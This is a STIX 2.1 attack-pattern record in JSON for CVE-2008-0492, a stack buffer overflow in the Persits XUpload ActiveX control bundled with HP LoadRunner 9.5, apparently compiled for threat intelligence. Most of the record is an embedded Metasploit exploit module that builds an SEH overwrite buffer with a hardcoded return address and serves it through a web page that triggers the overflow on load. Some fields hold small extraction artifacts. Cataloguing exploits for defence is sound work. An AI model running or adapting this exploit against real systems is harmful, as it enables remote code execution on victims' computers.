{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--81f78efd-88cc-4f2c-b9dd-59186ac22552",
    "created": "2024-08-14T16:40:36.28511Z",
    "modified": "2024-08-14T16:40:36.285114Z",
    "name": "Persits XUpload ActiveX AddFile Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Persits Software Inc's XUpload ActiveX control(version 3.0.0.3) thats included in HP LoadRunner 9.5. By passing an overly long string to the AddFile method, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hp_loadrunner_addfile.rb",
            "external_id": "hp_loadrunner_addfile.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0492"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Persits XUpload ActiveX AddFile Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Persits Software Inc's\n        XUpload ActiveX control(version 3.0.0.3) thats included in HP LoadRunner 9.5.\n        By passing an overly long string to the AddFile method, an attacker may be\n        able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-0492'],\n          [ 'OSVDB', '40762'],\n          [ 'BID', '27456' ],\n          [ 'EDB', '4987' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'XUpload.ocx 3.0.0.3 on Windows XP SP3 / IE6 SP3',\n            {\n              'Ret' => 0x10019d6e # pop/pop/ret @ XUpload.ocx\n            }\n          ],\n        ],\n      'DisclosureDate' => '2008-01-25',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit = rand_text_alpha(738)\n    sploit << generate_seh_payload(target.ret)\n    sploit << p.encoded\n    sploit << rand_text(1000) * 25\n    sploit = Rex::Text.to_unescape(sploit)\n\n    # Build out the message\n    content = %Q|<html>\n<script language='javascript'>\nfunction check()\n{\n#{strname} = new String(unescape(\"#{sploit}\"));\n#{vname}.AddFile(#{strname});\n}\n</script>\n<body onload='javascript:check()'>\n<object classid='clsid:E87F6C8E-16C0-11D3-BEF7-009027438003' id='#{vname}'></object>\n</body>\n</html>\n|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-01-25",
    "x_mitre_platforms": [
        "win'"
    ]
}